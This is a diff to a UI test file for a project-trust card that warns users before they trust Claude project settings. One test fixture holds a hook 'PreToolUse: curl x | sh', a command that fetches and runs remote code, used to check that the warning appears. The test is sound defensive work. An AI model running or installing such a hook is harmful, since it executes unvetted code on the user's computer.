@@ -431,10 +431,15 @@ describe("ProjectTrust", () => {
     );
     // No sandbox here (the fake reports none): said before the Trust button, not only in the details.
     expect(testid("trust-no-sandbox")).toContain("without a sandbox");
-    // The lists wait behind "Show details".
+    // The lists wait behind "Review and trust…"; Trust is only at their bottom.
     expect(trustCard()?.querySelector("[data-testid=trust-details]")).toBeNull();
-    // A click right as the card appears is not a decision: nothing is sent.
+    expect(button(trustCard(), "Trust project")).toBeUndefined();
+    await armed();
+    button(trustCard(), "Review and trust…")?.click();
+    await settle();
+    // A click right as the lists appear is not a decision: nothing is sent.
     const trustButton = button(trustCard(), "Trust project");
+    expect(trustButton?.closest("[data-testid=trust-details]")).not.toBeNull();
     expect(trustButton?.getAttribute("aria-disabled")).toBe("true");
     trustButton?.click();
     await settle();
@@ -472,7 +477,7 @@ describe("ProjectTrust", () => {
       ],
     };
     await show(core);
-    const toggle = button(trustCard(), "Show details");
+    const toggle = button(trustCard(), "Review and trust…");
     expect(toggle?.getAttribute("aria-expanded")).toBe("false");
     toggle?.click();
     flushSync();
@@ -493,9 +498,15 @@ describe("ProjectTrust", () => {
     expect(groups[1]?.querySelectorAll("li")).toHaveLength(7);
   });
 
-  it("says one muted line when the project has no Claude settings", async () => {
+  it("shows no card without Claude settings, until the review command asks for one", async () => {
     const core = new FakeAgentCore();
     const workspace = await show(core);
+    expect(trustCard()).toBeNull();
+    Element.prototype.scrollIntoView = vi.fn();
+    await listCommands()
+      .find((c) => c.id === "projects.review_trust")
+      ?.run();
+    await settle();
     expect(heading()).toBe("No Claude settings in this project");
     expect(testid("trust-language-servers")).toContain("starts language servers");
     expect(trustCard()?.querySelector("[role=note]")).toBeNull();
@@ -505,7 +516,8 @@ describe("ProjectTrust", () => {
     await settle();
     expect(core.sent("projects.trust").map((c) => c.params)).toEqual([{ id: "p1", trusted: true, fingerprint: "f0" }]);
     expect(workspace.project?.trusted).toBe(true);
-    expect(heading()).toBe("Project trusted · no Claude settings of its own");
+    // Trusted, still nothing of its own: the card goes again.
+    expect(trustCard()).toBeNull();
   });
 
   it("asks again with a summary and a diff when trusted settings changed", async () => {
@@ -525,7 +537,7 @@ describe("ProjectTrust", () => {
     expect(testid("trust-runs-code")).toBe(
       '⚠ Once you trust the changes, 1 new hook will run commands on your computer: "PreToolUse: curl x | sh".',
     );
-    button(trustCard(), "Show details")?.click();
+    button(trustCard(), "Review and trust…")?.click();
     flushSync();
     expect(trustCard()?.querySelector(".added")?.textContent).toContain("PreToolUse: curl x | sh");
     expect(trustCard()?.querySelector(".removed")?.textContent).toContain("Stop: ./done.sh");
@@ -591,7 +603,7 @@ describe("ProjectTrust", () => {
     const workspace = await show(core);
     workspace.project = { id: "p1", name: "demo", root: "/demo", last_opened_ms: null, trusted: true };
     await settle();
-    expect(heading()).toBe("Project trusted · no Claude settings of its own");
+    expect(trustCard()).toBeNull();
     // A worker's changes to .claude/settings.json were approved into the project.
     core.config = {
       fingerprint: "f1",
@@ -669,7 +681,7 @@ describe("ProjectTrust", () => {
     expect(testid("trust-risky-env")).toBe(
       "⚠ Project settings set ANTHROPIC_BASE_URL: once you trust this project, it can send your prompts and code elsewhere or run code.",
     );
-    button(trustCard(), "Show details")?.click();
+    button(trustCard(), "Review and trust…")?.click();
     flushSync();
     const servers = trustCard()?.querySelector("[data-testid=trust-details] [data-testid=trust-language-servers]");
     expect(servers?.textContent).toContain("in the sandbox, which keeps them to the project");
